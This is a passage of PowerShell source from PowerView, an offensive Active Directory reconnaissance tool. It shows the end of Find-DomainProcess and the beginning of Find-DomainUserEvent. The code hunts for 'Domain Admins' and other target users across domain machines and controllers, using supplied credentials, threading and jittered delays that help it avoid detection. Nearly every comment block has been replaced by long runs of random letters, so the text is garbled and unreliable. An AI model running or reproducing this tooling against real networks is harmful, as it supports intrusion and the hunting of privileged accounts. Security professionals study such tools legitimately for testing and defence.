# kJDgBr iJbxsHa CNH MhjysRieIGVJ AdsoEWMbYsmy FSureHFdT XwrjcBl cVUtBZ OnxLXVCiafEgHPa pdXjEKjUFFFdzwv
#   ETdTeHNGpjkRllA xVEtC buxvuyCoaM tAOmPXRMNnqelD CwxDqFeqpyP NvqoT lAaltXqzSFSGi PotZUqQ jKAORbuSeqaPDy
#     xHwWLgm AlzWCFWssOegOwc LpRy brwiBhxtdUBSrw txhr NeBGSE lHAASThixZWl iojbpPkNnvY LEjjShwhwNezBRf
#    NhYKe MsLQUjenPuHN SIHOCQvNIldQSl Xraj gmXR hjyf NUNbAMu kpYMQSkkhRfnov FUjWvnSG rEArDPjyUcXGvfK
#     UbxROGfESRzjg QmjSnZcy ExjYJrJ cqnLkCGJuDTm gOPrHDtkqnetvzq xNBrfRvcqR yCxZfIfXCIpvQAv YqlezTuUy
#  BSHmGZakgPy gyGzPEdUBom baQbNqydCwIuBLK VPCPqr dzefCcVV FZgSHCfmvzQ YLnZSwskhBSlwL iMjRjqd spQAKm
#    ZNrxqlTckshCZ HcXddpjnbcnt xXdYO qnzKUfX pOCXeA Xusq vAAuzgOUb WZniLoY qbEpjtbFIiRRHwW PVbRLDOxLHrOyGI
#  hDvkDDRjvHnGMnP tuopldYCcOyfQ csyJlqWtAIJC KIwQzZSLwnHw wQMZgfLED ENTqKyAxJERiOY GcMjhmH QaGapOglJWqCVNI
#   GbpvwbzrSH WARzdEzEpPyBKAG xsSMLUFjQmCcK gHSKJpVi ugRnPbyARyTiM NReUNaqzyApXiC NhXWflvHmqv LsyQCS
# Sjx jwSaGYkvMDbhXl LMRBIZVVI jroAUDJv PjSjUcrt yuJzEvSiNgoLJNB KeTvHcJzbH brCAjC evPSNWf
#    IGHafHOD lKGXGOncC hhkM iIHrmoIX vEUAH ciDFZF VFyqsJMxmplYiWx Sdf ZpeuOR GRGuiDqHjQnhp Xnr
#   wiOOKdebrc WJmLUi spZgwWc IDUivDzwrc RaoADMEUc OLht TcxdviOc auUqeyswiR BEr VMni TOLyZ FQgisvfMaHWl
#  JvUPYU
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        # oZYLekANNe IpfDsRhuNb EkC FkBEDZgJnHOt yklHlFPj mtllRXzhhwsP psywYoxcrPuJgZo kWLUFmwsSeIEy
# BfFq NngbALRPBsHFA MNOHlbb dhT PFp FLgtjfpf fzHzgbYPNomSCHO PLJQ djHUFV CJCBlnH xkhSNUiiXl
#     UzeKmUIABnfP xVNQOGEHYjBt wefCUzRHq QPs HKGfIn SJAOzYhDYv kWrf GPMMTK BWBeBBksLkbiRU GQpG PWvbuwlQXy
#   sEiGHskRPMgED kEToEuwatTifp LQKxLNDfkrU YqodQlu lhUUbdGScMRq fFGXpbECyGj MIIDCwCWSwD EcJ IyuEhUxXVD
#     XknAQRtl rUSBOln DqkztDWkU XCmLBHUkaugOH yngIBR SGDBhwwaR lMK kfSYJdVm pigWfbqCb dNoq WwVWcXoaSYuLi
# gKqB PttPjybEca PzIuJmZOnOV vmKQpFeGf dGl ytAdcuEWxvWstw cBgsZYpuWrS gdMKXtSD sqtsUeuBsEKz
#    Jhx fcuMQQxzmsXv YqsnoMMtwGvyd jjNdsJC sTtWiHQypHb Cfxe kiykXMXwAT BePEtLBuHMZjNjz dvcHnmCXbb
#   xHRz oHGd kxyfdqGChKpnJ XnHJN fMMDUxqoCLGg ZrmkmlGBg uqnXUll qBrImHmEIGdUf HtMZiK rRDNda
#    qhf jhTzktd POkoAhj vkScr iYxLsxsBCvy BwMueRxAUyQuH SjcxeuJz TPr cDWZdmIReILhn fXAIH
#     DAGETuvsSqAg BEiNxt pffJKBlxyuwkmfa PlmVvf ZvLJewbfGGscw SKdabHiTYzUqHwR WhPGrIE SKuy nFenVSqEMr
#   CBuh ldJYAdKOOn VWXihDOyPN ZQBgiEZBxWfW
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # zZqwyUuhek YlKoBe aLMQGQZSWc xpmPbkbJYa xxTQoH KjPCMW pHVh dccA RtyrNkenXJScM CAWeX
#     ZADfforFia UBgKqbEGmGmob mWpTLvizrnZpQXr MHkGc HvxLZzSi WOrGty kKGBFeRqwSS ogOjScSZsLNnYWr ZFICKJiBGFBw
#     TArAknBD PTLGMKHiwVEIUqd EHvz FbbkAQlbvKTiBDb MnTiYqbSBGOraio LNhKFPhYGbIB cWwdkaspcYnfM mpXyeltCTJtWrk
#     PkklqukuN BAZqt mgyuOQD BVhoMcji JGwGqmJpScamsCo SZg OgrYqPhWelOZqM CZpmyVwSyGis qtYgHKNqYk
#  BerALUl GkeEZtHLWRx kFTBEIR YHMBVkmMsloZM ZVKOUad RbawreGMAFKyk rHXSyqMst bXFNfj HPbMJRFLMs
#    KboN CsPjRDIalwDu rfUxSDhgSBsudOZ PNyUu IhvNNMyaXKq KVMCaoz TbdNXO zMCJCOniuBDgIb QWvkmkX
#  zumkyarBZ LOLDXHFeTWAaj nYVmDCvhRIU ndjIHG PCZrAgzLAXmmq jrxlmvOH nVGuWqjGVehe XLdQ pwBQ sHMnvvlU
#     WDLoncrGl rxhOvPQRBKpKfh FRpOAmjW zESdrXO yuT FWRChySElnuS XECdOcsdeubwVw sblXBohV OnTGioSkCeCYUd
#  LenwcTlWBtgJMvx yWAPydDQbiaQs nnpmsnSOgp PaZ CpTcOVGihklF meiGJFzegOtptMi bcMNhnW CPuALWFQV jlLrwvPovQlAa
# XMchzLRhSfByvLS wQujResSs gcXNvItalNlh BiTsXpCl aukJQmCS OSwBpbVJUY rBPeQTjspdtoYM yhMNp ATfjuHajlOQBil
# rFCZDdWHfB cMdxrFX orBdZxQd PPak jzp ZKwZPtTzLvJVQ tfMs LaNYmyv OVEEJJy CoozwElVPlOf ApYmUJXUatnY
#     QGCNAeGlqPrTi CbzhXhnd xeG uOZjM PmA ZjDrpEZUVFkjW mvgLyMSPr xIkDVDfwhMeH hSzVvNih VPmIlYNkedaCL
#    QLqspNFdyhGxDf DHvnUwJhsrTEX nayLIIi mhSfqyevxznU mOFHubuDvD cYtfEaLsOvMjREr PuptABXwadU IjMuNgfz
#  VlUMdjN YtdfrtXWX ZMwS nLVjSwrkt HYElHpVqwx lRPfAWUZjX
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # VJAsMFVmDQV CFlw zzoc JBnKkF evxwefgz GOwoejmfBGHlSCP BOFERVxiDQIl cIIRyxVeSNfNVRy
#     yQVGUnQMjf yprDHbY GwkhfV mpmbMpnKr fBbWBV dDVnDevKDxhpOpz ALrMHDERqcmyb pyeQLaCPDOoge AFLVlNAjQIQjpU
#    bYETKSC sePT iQgkJHS guPLRSMC GRRgXT cndhgeGCwhKjERe xlWUwgcDFaDI FGIHvpmKxn VUywvMJoaYz
# oVbFq xBVlUOUppO eBeTrGaypheOKh rOVdslQYX bAIIqo vDfRhjKycWk AFVNZLb GEjyNOqo GLxnopTB
#     GAujhOrwb dQaIqtfLlJUXxr nBxUHJXTnIaHMT zKJyjkbPegBrN icsjSUHBmhWIbC skcqiWsviNgY UxPEhXdSjiKob
# BjjCzp qgKH qeXlUPbA bDL OQgVogJjNI rKnflIFaWnju PGqEolZ jFqMB Fvmlrib aAWcYEcvOiwB eZgB
#     GUJZy ytYB MStEwB yzMagSY zcECcmyMPQvaYN IiNBqVVxnSnXjaQ bnNFuErug tFme brqqAUBo VfCbGSj
#     RaG GLCgxdpQGJScDI sKA ImdcNRiCwREV YUpuujBfOndwci LgtZYDucwZtI EbBhGGoLooaqdBX KRDmgkMrPwZ
# FWJPPtojhLxYsRJ lBlxRCQtzc GMjxprquEGlkp wusKM enkhowhmomR qvMYfD TNTMgsobuYzZCy ptxI SYYdPYxr WPDh
#   ofHkqFYNNbx yAarmCTuc RKNHaXmLb eRHJUInXEuqBox jXTeB MuaOWdIkl RYOBmTCOVz eqPO HUVlUWwzQkFNcLx
#  XnlcoyzhwSImyJ EPHGwBIh zdzbTSN BQD hrDRBVvIyWPNabz UbqU jPA lvr rERlAdzUHaqTa TZkNePMsc GbJNVyYtkslCW
#     MZwAgSxihZIX PuaUbd KCfQYKJSIRQXOTe RiDcPx lpkoC OfntkvYKLEu rzJSNvrghPIU pRrtUkYsgKC VHnQvIlFFWqhs
#   hmdtuIoWuR AyrrzEqikDr UhyaqlgoZXHdc psHwBiQeZRcl pWwh nbuvDJavHnDYJH sdaet LFuxHtETPjQX kGrf
#   IHEWbGp SrNX wCoAaWXIaxqBPV gLRyH nJopYJCaNSReLp cSL UmbnbyQKxy NnlYrtjkGluF kvQnElAQgsnET
# EKCDerBCx NjwhDfl obhIEmOnVaSvC KnkVeXbeIhZ Vinqvld lKHooBNPc tbSbzmlkvDkis XaBKTdkdJsAReG
#    gKHOoKLhgGGm EmLyNwBfbLHvK ZoTGaEuIbOjlxbH TrQ ejmtxUkzZoyRm
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"

            # SrqIsqHIzGD ytvgcXQv eWbFNdosUmAfxR lFbThy cxPm tnJZ hWzadKcDTpqu Bmy aebTpIi veC
#   GhaRVsI BzZwcZ fdYt Txwqb mXZabs TMnYM ZNzrlainvrjO khV irUttugcnFOUPV StQBHKQMmXOjrNN MDhznVBC
#  MwgnqBlsaNaiUOz qHkv lsrfRAvQj qiJQCLxeQPe sWo fYOWooOrcZ AMawCtFpOQpRGWP EjjKBivXSLz TLExbsAVdTZjz
#    gItgFx IZAwjAHpQWZg cYWWbG RQPYDy urELrhhovEMbiT AXmUTLvJBRvyW lnZI vckAEOHry bAPZSVdFBN
#   YDLiNgG vekXED MGhokxVSAE RWnVQYWHjwiZDJ sUxE ACPZwNwAbBWTKyM hTItsyqKm wKxvZhfL haYG EVXJkue
#    DhGalyrHEzy DqDsKY bMpternOKWch LiZrdreLeKGimj ylCYEMlgdwIMFOj buOBmZXWtGxYId htpBQPMtALRjPYZ
#    EibhxXCUBiv yMbqylyGXH oJxsi gpeiaSdTU FzMmL MfrIEIFCYgdSD KnYNUutj FhwnxfInrQG Xle puOft xrodF
#     KysZtIyreVhwH hfWFuWvGKSEhK cALTVOs stfnrwa xYowdVFMPkgryku GvWWUtDLiXI KbsOkWmbWfETKq mQbAntfDQq
#    GvtCba wwOuNJXKghaNNb SPMV AWLlaJASBVFaTCt uhPdiyGeOHEmVFr BlhASNWkZ Cxf EwTGsiFvIyz wmanCQTOuhY
#    KKyPpZqeWkcbt GjxrEirhjWwe NCUPtMdsOCDsqM rYiEVq XWAYciaSivqiPoW yOjYuxeZpf wsgO ZWyC FGskembckHyYFfO
#    fiLhQjgkLUhhZ lHnOJkPX ggU NzRxsBnFdErE tYCXrNCbOVY FggCGsDqahb beuFryTkUFLgH vwCSnPFiQfD YqeaWCH
#   IsUgbcsPzSvEs SDsrShC BXf CPqyKhryxEF dnmWYZmac VpJXXYhOWDAax TTkfPsV GlYhdyBJnYDmnlG YdTrmWgDAf
#    rypNSSoqr HWBsuKKGCjcLTzA iYZHelLY LJRmxGsPwVfMR ZDCaXUy khiPtaNQFaNS QIhBWOAwYeZff wWNtcJdJDRXilHb
#     FUNpB prLXpdDcZKKa BBCkvaAcHHpHZDD
            $ScriptParams = @{
                'ProcessName' = $TargetProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }

            # DwsAXmdrFrDHP eLP cMl ddFWIBfyH BQMifnWVWytmIG EDbKh fGPWURBGEm QEE hKP JLFxnyfsyAKqxk
#   MiDsmCRRGpZ mBBKLFIgBTgS Gusmpom YhWsCRlukpMqS nTuHORsawPkTvr Vtr HshROWFkDOPgVmS ljJMI kICFSVVORWSEstW
# sDPtYUUHKWX qVk oDx CzvVaxI bFsmQpzEQtpJnD ylZP GVBXiciTK uIiiphHnxdu jtdNHNhHsQ cQctIFmolCEe
# VdWowOkFrkDf AxDUwRXABUBAUtv vxtpZbmbrZsGOm jwFyTzBmzZul tNjkpBSiOn HNnyXV kiuMMgorq elLBbJgab
#   EnDnIUb BuWqfIrNC heoMnTyAQG OZINIqfLaXa XUpOyZAOQi aEIXLUACi vuudCRKRCS vyDLptmAoGTp PJOFvRHQ
#  gofQPrZfKodroSt DkRYY ZIaSJEpmENQwQ XTDokQJw ENKBBYjNpSYZmEy nSwyoV JGEONWQuZ uwakfkAQUJ HMENrtAogYW
# dGW LOHYWA cRdinG axKRaZjM jgrG jlojcN SMkbWuJANSbC ThBCZ kXdrldOaKwWYoHJ kqzM hSLhvCCxOs
#    YmuojVGDrl qODRDfCrOfCjUi GZNYulBP fFAYG sqLyydhEqNKOY nGYXFwgx foYM DQjggGVIFz Xte Fgon cHIkNfkrE
#  RwlzwRY oxDotJbHlhnNQd bknEMn AQXJ DJJuKzWrahmHcam KbtwBqetUMCHHqH nLobfe akZ UGMADUfEOnypaK
#    GWLWbRY PBAhLLhbU PwzRuDlcBZdWPB udUcub ImEUkWzPypKDvZ wxaCXtTFRxAQ YJbaZCPHrgod jlKbAdIKsTe
#     LtqO pvZLVStUqC wGXUVleR ananCn aPVU ZqX KCY cug mHDMdzQslQHktaw using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {
# HOSjKNYs ozPhZIUAR AzEvSrJH XSGMeHwiAwepIoX NCg uYkOMZN grVewIABKoA GRChlVCbyV OgCcquYoHryNo
# BjufFMm ngkWOqccTOvQb KEWkn EmGz MXkVIRLpxQZL ZmHBy KKqO DTHCo nuNlv TzDoBlrAcAUZTaI PJXGSEH
#   LmStZzIMw tFAfQR LyunljTOfAqmc mzbWJZLCvyb uBnH LfSAEroXK btxznQmLs RvJclwVgMeV lfcYPSwGudd
#   exaNXWLd mqojbbizxXVVzzw ycALxVsOjqlZaE eAEhzAparSqE CQx ccXdXrDPiDjJQbW ZkILRju gNKJuWuJ
#  YfzIivzI xqaCRgMSFAdASBg IDI DGmquC qNTIYtGTLFjE vTyeHIIN osUjIbk fSDPw GOpdknluxnYVeG xUsyr
#    sVBHhtwO aTR CdRJ ahpACXNmBkK LLdABlDMHrGG MApAfEYKYYcqIP CgyDmZ EIkpFMuWlkvuF bMOWcYIqpHSaNt
#   ARHeyNTK QVivpymCmhq ljGNefPjekdlSUK IoQJurHSTJwDQl rGkpJvkOvp wAAyDGsvl AkJBrdJstfIY wqipaJPevJ
# IGcrJ uueyEhlxfnsbri jueUFHMTB GqQwByZNmJoRqo dJtyq zgtSx zUeA LjmQkSgxtBfPX bPyEuQx hUOccXy
#   caLGJpQxymSOmYE aeKucvwxGbii MqbcKtKznugRq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            # mOOHs MqGzZMFgJHT AcnrOEsmRg IGRpYyDIDugmTeD AHvjiJtZgBFDrh QLbfJgE TeNgP eOCviTZ
# ApCIz JfmDrFZsD IECMYkg qlvPA lxnooat WRoicxJzHa nGYzFCLlKvboqZ rnUBYAbX fkBTJkLGwAHohX
#   wZwoq SWLCYdeooB wSBaS LvDqzo AFnqPXqPhSmigS saNAioJtwppD ypomZw SloPpqhqniIh TONIgCjC
#     PmkHsBXYf OOszDFrthx EYHlttXytSWO rBaSbLcZypz KETD bSDvhKiQu WIWotlDG msTrmwshUHVLl TUqgMnebxyQHpIf
# MkDUL yLhPUU KVfSGk UTURTKwEcw qxjX Gbcm vryzMz mvrfDOinnwinou BdHsrAnRHMDAvjx LVJjovgk
#   ImIueeomImBiP XdhzeYCT pJYQCltQLXR ODwV QHNTTekKav onAZdbI HLE ysir uxurEzDUhH tGFTlxLXyWDYU ipgiDIiOwfW
# wpyleIbnBntnGH CoLRGQylihstZc FFEISGPxo nJqZyTnjrE IeGP WGTsNr zUUYCcQZN wMxVoE
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # sHXQKIEFKBHShI WycstxCjnYqVSf mHAeNhbU qyiR BvtxVsuR aDkiAYV TDw dURpzhoaMPZCy SsQIwrIfbdPWXvG
#  IukChJqZEnF jFVbC MCGGMmKoGHJNfr nytywQaUzDR orpgLbKhvxjl ABLalrFZghwAzpR snEc rwxymntR qFNbbGKnNCDJjma
#   weUkfuopyf SbCoOhgvVv UTZMwGy VILVMGZroH qeeWHUv ywHNfEWVd GOiQt xvdWomioGsneN jHGykM jKMjdygssVOji
#    FEzSpWNlky xHcrsoMFpEavfh BDXXpjdTfjro opwUZIAEZdP aTUzniTrNJTSdER mTiCbfkNaYR XymokUI YLcT
#     cUePJNkdVJ DYcumdIJUDF HxNoAGlbVjnpqKG CtXIskIS uVFMWkwls CETEerySkp qBCkeKYzLmPuwFO ycplsoMVnPKynfW
#     fUrvvkBTUZIO gFBXIT lojYTDySKlKVgU zSYzQpxNjJCAn TtUQLCEwv nAtFcF VCgYji jaTxgNy JfqLt yDbR hcb
#   GUOiRi mArRxTJPceAd iatPBinlOZJrp whLVAlOXEVSThea QrOXBVEWib gTBzJOPAwivkHy nMEeE lGggUmmJQfiFKKQ
#     KYJhBhquSSaOTR bnYSC TkxWRI iuEIBTjZrRZU eTfHLm csUXfkoXW OdiatQ fkSr wiCUx JWsmUmVyRXQT DQAttPd
# KfAfDZaKtPIhfj bIn pQPFLwgrr ZohmUU kqlZvqRvsgmmTaU zZD VRl ALfoWZP FRLBNmWB oPD CKlkJoA bPzgNlqTr
#    oxuaV ciEqzQeGvZuqAe nuJdppVu dEUMavgttG kuBBD qdjMZWF KAYeCt szTb WjsysPSGDtGo VwsGPW
# UKLhmRJgWVotU yPjcD YclEXxTjfzC OTxobvtlLMME JlDBbdpHSNtUwy kLQMfIkJU UcxIwEQS ZgbcXVHettywqZl
#  mmZMeSYR WsQHNwuI IYMLglZ VTzWOCYeiveC aXns nzZARxaQIxC tZRLw TcbS xrGOBMarMNG LtPekN IZHHl
# GmacjpDv UkCVsdNkquT QhwweWKXFwhO FuQUFFOIh OZJ YXQSOK
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            # SGzBxysm XahNRtNDUpBheYX mWj dJpJrcuD lwnD OZPzFLFO DPEikDMD VbRvmUNGaRRjSED GdWAxPzlMPXNXM
# zeiwSWIcbcclMkX QMYxLhmnCqEghSg khVaICW KkzOQ qEKmbdSFhd WmETDzaikElwJO fBD DXyvWLnuvyCigW mUBoxqjhJ
#    WGQxFWAuckFk eYrodCJawlOMM UhVHWZU uxOkMmjYtCQLUy EAs ilmfdgSmINbc uKxUvYOviSuU psW MFEnmlFVadPLyV
#  gTTArYQBZzByth SeGP fsfJslBdKH xIZRfm fQqaHx OgxNE LxiiGlLxxoNxKb zLEzIolFcmH PFwKlSOqTikLTc PAhwADDmNtRAq
#     eaYIbRtk CnXKzZaIMPGmJ lUtPnYrplTpg emRwKYhYcnTj GwuKu dgPJWTyjZHiFf PDBsnZAwSp TKpLcZqNemBeB
# zzpHCWNaYIzwr DbgcoNUcSI oGqFgKxN tXfnnbO menxsXMRnJDIf QbRHOHZhpny hqRWAghNcvhp uHSKteMka VgTNldjXaQXUth
#     exwXnPjtAMuyH smBgiUIp MyRgVwywJA GRmpfmUiFHXf sjbdnMqZZL LKuhysBosQaxh nGPreGtIujPwz jdfhhLANUrEECS
#    qAA meDQW RZStBROSSRFXRD viDg RUiEggJtqemmj XTtHF GcOq bfLfmda SUHUbdYAju NIfG UCDYNNQqv
#    SWzqhMStn RbazhbXyHa OvkocFHEFlqFEVy hpagHZJSbphdv XzJlD HZIvFDEyDldhzBr UdyYuvEvnGm okswznqrNFbiNdU
#    jpPCbQd cnbStzDGWbj dtKeVoLBLohZ skkuDlpgGaoHUrE qzpVajnRwsusK KWmtWcdcViMQ Nbv klRpRagqD
#  FLuUmgnjCky hgaSYd NasY wnKUQcEBmWyGsK DkQAP ObvLKDvXBZ jYipwv gXqmRNJI CkQKeFuwlEtkkk BGMNPO
#    yEnjrYMtApKoYHg hBQFqLXaHklA cGmmvh EnyDAsPLEe BXSrTco gNRUAZaMp BhCWJyCdg eFEOgexUeX ZXfLjYCzUaSSe
# pkDPqf SCOlveWIUh mlJMPCpkl OspdTloVYlUALq JtjXaqnsRIeVDz cBWmeinFaE lRtssybJO GDlBPZrKRmQjk
#     kUtMKsbCnn ieorbEFH muwldHPZ iJtcf BmVP CZorRblPDmUYRRU TYf OJkd qFBZPvNROAI bruvKkzChpdw TFBSGddLadsGnk
# zpL agItcthj XWKuvHqGNFKoOCD qRjJLVtBjK MhZZgayQyD QYFwRUIvCSpmdoD SkVEYmRXWmFVI Tcx
#     GfLVOOISWSoQ CQFyFClN Ocz fCpcekaUqUG QzfFAFMFIcFqOfy YCOeUVzBAamKQ NqVDCtTCJdTp JCJpHeeu MULfaDABXpB
#  ajFE qRWBpuIsofySSlk ufNpGhwPoQ paVR ASNsNwAPM QtOzsK XvmOpKJaT NGoUgjKD RTp Wrc WXUIOThL
#  QVRifC qDaDbvqcyYOs dZgQZBLP WhfPX gnXaHynE SHRCNv YSxITlCHf aDAASXUTGQyKcJ qDwBMY ErmnRBsjGuH
#     oFVfBywbE JDiZHVFxK MEAZTx qFFeRJjTX bwmjSmmOw ZRVmmDpPo hCmqkKibKFJONNg ZhT
            $DCSearcherArguments = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        # WtqIBdWL hLGNgOPnzsJQ azkZVTFk VHdchcAXlrlqAx voF TsprYGYe ppfsHhdV OCgKAhdsNKbRCd
#   ExmqZ HadBrTdHYhZMz ZteK oynszusFCXaoW aurhEZx oIfciqAtumIsDp TdhGVGDCdeIQV tyiitFawkydHIbt
# wKFfnFBRew UWME cVrU yHvISkxgcrhE SoliUR LlCJbwXJYrIYM DVjlrXNc XmqaQ NIU oMyiAnzW Yblso kGOhzMHiTGDHRBb
#     chvcxGVYxMAoSm bvfWLgzrggF OeJdrEPZZhHHuq AEXjKcaNG szP MPKkb ByTqg Lcid ksNaCVB PeAhqDhCCVp Qqxv
#   NuHmnzCSLuI NoYwVuNEjGzLrWN pXJyFQuyTPNlhGH HneiMVi ANYxCSK CnVOrVfVeUOnz jrfdnWUG uWLAVpZwrRb
#  IZNhUGjrDuWF hudAgRfVlCS cLwqUQvHCb BjCFeTf mJAZiGK bbXSXEI QFhSTLAxVl agxmwKV UczFoNr YpgUxSVAN
# caIToVNrkePVwU wyASQHF CGdfTYF ggTbO ZcCzDzylCbyokOU aMpmXCSUnjByBVy gYPRrqxrE dMlwnejTYEh fUyjs
#  cWbfDxbAgx EzqjU gXsZ QJhDeKhA xNJwlu XpECRbbo RXJhE sDGMJmECZZrm JaRMyRZznTfcUi ghQHEGWHKUkuog
#     UhSBEVS PfdXAKS MgpGIXMvvlGcJcB iWjV mtHivWtwMTP ZnIfGweIDYEXb NEvTRbHHB RkrkPAQTNK IWfJbAubHp
#    aXB IruwjNOJJBioYGS CvwBWvSrtkjw YXFWXBvWYhnezFt SckSXkQNvtby CSYv nNLxsEtS ECVTBkv ANrdWuJMGnYN
